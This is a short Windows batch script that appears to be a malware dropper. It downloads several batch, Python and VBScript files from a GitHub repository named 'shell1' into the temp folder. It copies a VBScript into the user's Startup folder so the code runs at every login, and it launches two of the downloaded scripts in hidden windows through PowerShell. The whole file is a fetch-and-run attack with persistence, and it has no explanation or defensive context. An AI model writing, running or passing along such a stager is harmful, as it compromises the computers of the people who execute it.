@echo off
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/pro.bat -o %temp%\pro.bat
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/sh.py -o %temp%\sh.py
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/vb.bat -o %temp%\vb.bat
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/vb1.bat -o "%temp%\vb1.bat"
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/start.vbs -o "%temp%\start.vbs"
move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
powershell -c "Start-Process -FilePath "%temp%\vb.bat" -WindowStyle Hidden"
powershell -c "Start-Process -FilePath "%temp%\vb1.bat" -WindowStyle Hidden"
exit
